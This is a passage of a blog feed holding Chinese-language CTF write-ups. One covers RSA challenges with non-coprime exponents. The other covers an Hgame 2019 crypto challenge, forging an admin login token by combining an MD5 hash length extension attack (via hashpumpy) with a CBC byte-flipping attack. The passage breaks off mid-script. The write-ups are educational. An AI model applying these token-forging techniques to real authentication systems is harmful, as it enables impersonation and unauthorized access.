class="line">e = <span class="number">12</span></span><br><span class="line">p = <span class="number">58380004430307803367806996460773123603790305789098384488952056206615768274527</span></span><br><span class="line">q = <span class="number">81859526975720060649380098193671612801200505029127076539457680155487669622867</span></span><br><span class="line">n=p*q</span><br><span class="line">c = <span class="number">206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d4 = libnum.invmod(<span class="number">3</span>,phi)</span><br><span class="line">m4 = pow(c,d4,n)</span><br><span class="line"><span class="keyword">print</span> m4</span><br></pre></td></tr></table></figure></p><p>得到m^4为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20106844800109502536288854016069119595196463634259079507316147175432925273818188038332257297004492492765022431372230373366290144995921</span><br></pre></td></tr></table></figure></p><p>于是我们可以得到式子（结果太大，这里我做一个简略）</p><script type="math/tex; mode=display">m^4 \equiv 2010684... mod \text{ } n</script><p>将同余式转换成等式得到</p><script type="math/tex; mode=display">m^4 = k*n + 2010684...</script><p>这里我们可以选择对k进行爆破，找到一个刚好可以开4次方的k，此时开4次方后结果即为m<br>我们直接测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m = gmpy.root(m4,4)</span><br><span class="line">print m</span><br></pre></td></tr></table></figure></p><p>发现结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(mpz(2117561251816846604440536517998717L), 1)</span><br></pre></td></tr></table></figure></p><p>发现刚好可以开4次方，于是可以得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2117561251816846604440536517998717</span><br></pre></td></tr></table></figure></p><p>我们转成string得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;xxxxxxx&#125;</span><br></pre></td></tr></table></figure></p><h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p>题干如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">e1:0x33240</span><br><span class="line"></span><br><span class="line">e2:0x3e4f</span><br><span class="line"></span><br><span class="line">n:0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329893f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac5dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb11964970659cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356854eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1</span><br><span class="line"></span><br><span class="line">c1:0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9a605fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c770ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2da636f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9e28608ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618c6e81c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab8708d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c72160675d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d</span><br><span class="line"></span><br><span class="line">c2:0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b7942214dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c38031d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cabf83f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3cc4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe89e3f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9fcbd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac670946356b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6</span><br><span class="line"></span><br><span class="line">c1=pow(m, e1, n)</span><br><span class="line">c2=pow(m, e2, n)</span><br></pre></td></tr></table></figure></p><p>我们有条件</p><script type="math/tex; mode=display">C_1 \equiv  M^{e_1}  \text{ } mod \text{ } n \\ C_2 \equiv  M^{e_2} \text{ } mod \text{ } n \\</script><p>本应利用</p><script type="math/tex; mode=display">gcd(e_1,e_2)=1 \\s_1e_1+s_2e_2 = 1</script><p>但这里e_1和e_2不互素，所以我们有<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> libnum.gcd(e1,e2)</span><br></pre></td></tr></table></figure></p><p>得到结果为3，所以得到如下等式</p><script type="math/tex; mode=display">gcd(e_1,e_2)=3 \\s_1e_1+s_2e_2 = 3</script><p>我们可以将之前同余式化为如下形式</p><script type="math/tex; mode=display">C_1 = k_1n+M^{e_1} \\C_2 = k_2n+M^{e_2} \\</script><p>然后式子1两边同时进行s1次方，式子2进行s2次方，得到</p><script type="math/tex; mode=display">C_1^{s_1} = (k_1n+M^{e_1})^{s_1} \\C_2^{s_2} = (k_2n+M^{e_2})^{s_2} \\</script><p>右边的高次展开式中，除了最后一项</p><script type="math/tex; mode=display">M^{e_1s_1} \\M^{e_2s_2}</script><p>一定每一项都含有n，所以同时取余n的时候，只剩下最后一项</p><script type="math/tex; mode=display">C_1^{s_1} \equiv  M^{e_1s_1}  \text{ } mod \text{ } n \\ C_2^{s_2} \equiv  M^{e_2s_2} \text{ } mod \text{ } n \\</script><p>上下两式相乘，即可得到</p><script type="math/tex; mode=display">C_1^{s_1}C_2^{s_2} \equiv  M^{e_1s_1+e_2s_2} \text{ } mod \text{ } n \\</script><p>又因为</p><script type="math/tex; mode=display">s_1e_1+s_2e_2 = 3</script><p>所以可以得到</p><script type="math/tex; mode=display">C_1^{s_1}C_2^{s_2} \equiv  M^3 \text{ } mod \text{ } n \\</script><p>那么依旧回到之前的问题，我们有</p><script type="math/tex; mode=display">k*n + C_1^{s_1}C_2^{s_2} = M^3</script><p>那么依旧是之前的操作，我们可以遍历k，找到刚好开3次方的k，此时开3次方即为M<br>这里也是比较简单，k=0的时候就成立了，无需遍历，脚本如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s1, s2, tmp = libnum.xgcd(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line">m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line">m = <span class="number">211655262573966881062823795220179644607412162371069</span></span><br><span class="line"><span class="keyword">print</span> gmpy.root(m,<span class="number">3</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>写这篇文章不仅限于分享，只要能熟练推导RSA基础公式，不硬套脚本，一些RSA的变题基本都是可以解决的XD</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近刷题，遇到2道公钥不互素的题目，这里简单记录一下解决方案，主要还是灵活掌握公式推导。&lt;/p&gt;
&lt;h2 id=&quot;例题1&quot;&gt;&lt;a href=
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019-Hgame-Week4-Crypto&amp;Sign_in_SemiHard</title>
    <link href="http://skysec.top/2019/02/19/2019-Hgame-Week4-Crypto&amp;Sign_in_SemiHard/"/>
    <id>http://skysec.top/2019/02/19/2019-Hgame-Week4-Crypto&amp;Sign_in_SemiHard/</id>
    <published>2019-02-19T06:20:18.000Z</published>
    <updated>2019-02-28T04:48:45.514Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了防止整天沉迷switch智力降低，于是刷了一道有意思的Crypto题，其中涉及大概2个考点：Hash Length Extension Attacks &amp; CBC Byte Flipping Attack，虽然利用有些麻烦，但是锻炼脑力，从CTF开始~</p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>先看主程序代码<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    unprintable = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> chr(i) <span class="keyword">not</span> <span class="keyword">in</span> string.printable:</span><br><span class="line">            unprintable += bytes([i])</span><br><span class="line">    alarm(<span class="number">60</span>)</span><br><span class="line">    s = Sign(urandom(<span class="number">16</span>), urandom(<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(<span class="string">"Choose:\n[1] Register\n[2] Login"</span>)</span><br><span class="line">        op = input()</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">'1'</span>:</span><br><span class="line">            user = input(<span class="string">"Input your username(hex): "</span>)</span><br><span class="line">            token = s.register(bytes.fromhex(user))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">                print(<span class="string">"Sorry, invalid username."</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"Your token is: %s"</span> % token.hex())</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">'2'</span>:</span><br><span class="line">            token = input(<span class="string">"Input your token: "</span>)</span><br><span class="line">            res = s.login(bytes.fromhex(token))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">                print(<span class="string">"Sorry, invalid token."</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="keyword">not</span> res[<span class="number">1</span>]:</span><br><span class="line">                user = res[<span class="number">0</span>].hex()</span><br><span class="line">                print(<span class="string">"Sorry, your username(hex) %s is inconsistent with given signature."</span> % user)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                user = res[<span class="number">0</span>].strip(unprintable).decode(<span class="string">"Latin1"</span>)</span><br><span class="line">                print(<span class="string">"Login success. Welcome, %s!"</span> % user)</span><br><span class="line">                <span class="keyword">if</span> user == <span class="string">"admin"</span>:</span><br><span class="line">                    print(<span class="string">"I have a gift for you: %s"</span> % FLAG)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"See you"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>大致分为两部分：<br>1.注册功能输入用户名，程序会计算出一个token给你<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> op == <span class="string">'1'</span>:</span><br><span class="line">            user = input(<span class="string">"Input your username(hex): "</span>)</span><br><span class="line">            token = s.register(bytes.fromhex(user))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">                print(<span class="string">"Sorry, invalid username."</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"Your token is: %s"</span> % token.hex())</span><br></pre></td></tr></table></figure></p><p>2.将token输入让程序校验<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> op == <span class="string">'2'</span>:</span><br><span class="line">           token = input(<span class="string">"Input your token: "</span>)</span><br><span class="line">           res = s.login(bytes.fromhex(token))</span><br><span class="line">           <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">               print(<span class="string">"Sorry, invalid token."</span>)</span><br><span class="line">           <span class="keyword">elif</span> <span class="keyword">not</span> res[<span class="number">1</span>]:</span><br><span class="line">               user = res[<span class="number">0</span>].hex()</span><br><span class="line">               print(<span class="string">"Sorry, your username(hex) %s is inconsistent with given signature."</span> % user)</span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">               user = res[<span class="number">0</span>].strip(unprintable).decode(<span class="string">"Latin1"</span>)</span><br><span class="line">               print(<span class="string">"Login success. Welcome, %s!"</span> % user)</span><br><span class="line">               <span class="keyword">if</span> user == <span class="string">"admin"</span>:</span><br><span class="line">                   print(<span class="string">"I have a gift for you: %s"</span> % FLAG)</span><br></pre></td></tr></table></figure></p><p>如果签名正确且用户名为admin则可以得到flag<br>我们继续跟进函数看一下：<br>首先是token的生成方式<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(self, username)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b'admin'</span> <span class="keyword">in</span> username:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        sig = md5(self.salt + username).digest()</span><br><span class="line">        padlen = self.block - len(username) % self.block</span><br><span class="line">        username += bytes([padlen] * padlen)</span><br><span class="line">        iv = urandom(self.block)</span><br><span class="line">        aes = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        c = aes.encrypt(username)</span><br><span class="line">        <span class="keyword">return</span> iv + c + sig</span><br></pre></td></tr></table></figure></p><p>发现程序不允许注册admin用户，然后token分为3部分:<code>iv + c + sig</code><br>iv为随机数<code>urandom(self.block)</code>,签名sig为用户名加盐的hash值<code>sig = md5(self.salt + username).digest()</code>,密文c为AES加密得到<br>再看解密方式<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self, cipher)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(cipher) % self.block != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        self.T -= <span class="number">1</span></span><br><span class="line">        iv = cipher[:self.block]</span><br><span class="line">        sig = cipher[-self.block:]</span><br><span class="line">        cipher = cipher[self.block:-self.block]</span><br><span class="line">        aes = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        p = aes.decrypt(cipher)</span><br><span class="line">        p = p[:-p[<span class="number">-1</span>]]</span><br><span class="line">        <span class="keyword">return</span> [p, md5(self.salt + p).digest() == sig]</span><br></pre></td></tr></table></figure></p><p>解密只对密文c进行了操作，并且还多了一步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = p[:-p[-1]]</span><br></pre></td></tr></table></figure></p><p>这只是一步常见去除padding的操作，无需理会</p><h2 id="攻击点思考"><a href="#攻击点思考" class="headerlink" title="攻击点思考"></a>攻击点思考</h2><p>那么下面思考如何进行攻击<br>首先明确我们可控参数：注册时的username以及登录时的token<br>视线定位到解密流程，大致分为3步：<br>1.解密后res是否正常<br>2.解密后签名是否正确<br>3.解密后username是否等于admin<br>不难发现，我们解密的3部分<code>iv+c+sig</code>，其中c和sig都要校验，而iv却没有任何的校验<br>这不禁让我们想到了一些攻击思路，例如控制iv，进行cbc字节翻转攻击，令c解密后得到admin的明文<br>那么思路就接踵而至，当我们控制iv，使c改变后，sig也得相应改变<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p = aes.decrypt(cipher)</span><br><span class="line">p = p[:-p[-1]]</span><br><span class="line">return [p, md5(self.salt + p).digest() == sig]</span><br></pre></td></tr></table></figure></p><p>那么sig如何预测知道username=admin时候的sig呢？<br>这里我们注意到签名方式<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sig = md5(self.salt + username).digest()</span><br></pre></td></tr></table></figure></p><p>很明显符合我们的hash长度拓展攻击需求<br>首先是salt的长度<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = Sign(urandom(<span class="number">16</span>), urandom(<span class="number">16</span>))</span><br></pre></td></tr></table></figure></p><p>我们发现key和salt的长度都是16<br>我们又可控username，那么我们可以利用hash拓展攻击计算username=admin时的sig MD5值<br>那么现在思路变得比较清晰：<br>1.利用已知长度的salt和已知username=admin进行hash长度拓展攻击计算sig_new<br>2.利用原有Iv和c，进行cbc字节翻转攻击得到iv_new，使得c解密得到admin<br>3.得到新的token:iv_new+c+sig_new<br>但是随后我又陷入僵局，我没法计算出md5(secret+m)，此时只知道secret的长度，并且要求m=admin<br>此时发现关键代码<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user = res[<span class="number">0</span>].strip(unprintable).decode(<span class="string">"Latin1"</span>)</span><br></pre></td></tr></table></figure></p><p>所以我们的解密结果不是必须等于admin，前后有不可见字符也行，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x00\x80\x00\x00admin\x00\x00\x00</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-19-15-53-12.png" alt=""><br>在其中的都会被过滤掉，所以最后得到的username还是admin</p><h2 id="hash长度拓展攻击"><a href="#hash长度拓展攻击" class="headerlink" title="hash长度拓展攻击"></a>hash长度拓展攻击</h2><p>显示这不是一个简单的hash长度攻击<br>比如我们第一次注册用户名skysky，得到<br><img src="/images/2019-02-19-15-17-01.png" alt=""><br>此时sig为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eb1d2538fcb11aff70aa21213e7ddba9</span><br></pre></td></tr></table></figure></p><p>如果我们此时去进行hash长度拓展攻击<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line">tmp = hashpumpy.hashpump(<span class="string">'eb1d2538fcb11aff70aa21213e7ddba9'</span>, <span class="string">'skysky'</span>, <span class="string">'admin'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> tmp</span><br></pre></td></tr></table></figure></p><p>我们可以得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;0931bd0b164be725a1eba43031642e43&apos;, &apos;skysky\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0\x00\x00\x00\x00\x00\x00\x00admin&apos;)</span><br></pre></td></tr></table></figure></p><p>但这不是我们要的结果，此时明文块除了admin还带有可显字符skysky<br>我们需要将username控制为不可显字符,例如<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line">tmp = hashpumpy.hashpump(<span class="string">'eb1d2538fcb11aff70aa21213e7ddba9'</span>, <span class="string">'\x00'</span>, <span class="string">'admin'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> tmp</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;0931bd0b164be725a1eba43031642e43&apos;, &apos;\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x00\x00\x00\x00\x00\x00\x00admin&apos;)</span><br></pre></td></tr></table></figure></p><p>但是这样又有新的问题，我注册的username长度只有1，密文块长度只有16，而这里我要解密成的结果长度却有53<br>那无论如何cbc翻转也不可能达到我们的目的，所以这里的username还不止是为不可显字符这么简单，我们这里精心构造一下：<br>首先我们构造一个如下字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=&quot;010101010101010101010101010101018000000000000000000000000000000000000000000000000001000000000000&quot;.decode(&quot;hex&quot;)</span><br><span class="line">s+=&quot;\xff&quot;*16+&quot;admi&quot;+chr(ord(n)^1)</span><br></pre></td></tr></table></figure></p><p>我们用这个字符串去进行cbc翻转攻击，得到一个合适的iv+c(虽然程序iv会变，但key不会变，cbc本身需要控制iv，所以iv会变无妨)，然后我们get解密结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x14\xff\xca\x8a\xb6\xc3\xd2\x1d\x07\xd7\x16\x14\x86\xe1\x17\xb9admin</span><br></pre></td></tr></table></figure></p><p>（注：这里需要爆破n轮，因为我们虽然能进行cbc翻转攻击，但是无法控制整个解密内容，所以不能保证攻击之后还全是不可见字符）<br>得到解密结果后，我们再根据此时的情况构造hash长度拓展攻击，计算出sig<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x14\xff\xca\x8a\xb6\xc3\xd2\x1d\x07\xd7\x16\x14\x86\xe1\x17\xb9admin</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-20-13-00-43.png" alt=""><br>我们可以发现上下一致，我们成功可以利用hash长度拓展攻击预测签名值，所以只要注册用户名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01010101010101010101010101010101</span><br></pre></td></tr></table></figure></p><p>即可</p><h2 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h2><p><img src="/images/2019-02-20-13-05-44.png" alt=""><br>CBC翻转攻击的精髓都在这张图里，我们只需要了解如下公式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造的iv[1]= 原来的iv[1]^plain[1]^’a’</span><br></pre></td></tr></table></figure></p><p>本题中，我们可控iv，username也是自己注册的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">010101010101010101010101010101018000000000000000000000000000000000000000000000000001000000000000ffffffffffffffffffffffffffffffff61646d696f</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-20-13-15-15.png" alt=""><br>我们只要让最后的o进行cbc翻转攻击，变成n即可<br>例如我们得到token<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2d74da0969b99075b213e470b907f8e11d82f656d676080efda01be5b75941f147673b8e05686f98d2f1f6acccea2f0bf02a2bd1de59b70b31d84ebbc0dcec84ad6a8adab3589c919db153b98b9f4879ad492c39690116bbbc2f9e55d7e0cc0635e32ea23bbeb431b5c710094591d6fd</span><br></pre></td></tr></table></figure></p><p>去掉后面的sig得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2d74da0969b99075b213e470b907f8e11d82f656d676080efda01be5b75941f147673b8e05686f98d2f1f6acccea2f0bf02a2bd1de59b70b31d84ebbc0dcec84ad6a8adab3589c919db153b98b9f4879ad492c39690116bbbc2f9e55d7e0cc06</span><br></pre></td></tr></table></figure></p><p>去掉iv得到c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1d82f656d676080efda01be5b75941f1</span><br><span class="line">47673b8e05686f98d2f1f6acccea2f0b</span><br><span class="line">f02a2bd1de59b70b31d84ebbc0dcec84</span><br><span class="line">ad6a8adab3589c919db153b98b9f4879</span><br><span class="line">ad492c39690116bbbc2f9e55d7e0cc06</span><br></pre></td></tr></table></figure></p><p>我们的明文m为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">01010101010101010101010101010101</span><br><span class="line">80000000000000000000000000000000</span><br><span class="line">00000000000000000001000000000000</span><br><span class="line">ffffffffffffffffffffffffffffffff</span><br><span class="line">61646d696f</span><br></pre></td></tr></table></figure></p><p>最后一组只有5位，需要填充11,即\x0b*11<br>那我们即调整c的第4个block对应n的位置即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad6a8adab3589c919db153b98b9f4879</span><br></pre></td></tr></table></figure></p><p>编写脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">token = token.decode(<span class="string">'hex'</span>)</span><br><span class="line">cipher1 = token[:<span class="number">-16</span>]</span><br><span class="line">cipher2 = cipher1[:<span class="number">-32</span>]+cipher1[<span class="number">-32</span>:<span class="number">-28</span>]+chr(ord(cipher1[<span class="number">-28</span>])^<span class="number">1</span>)+cipher1[<span class="number">-27</span>:<span class="number">-16</span>]+cipher1[<span class="number">-16</span>:]</span><br></pre></td></tr></table></figure></p><h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p>知道原理后即可编写脚本如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 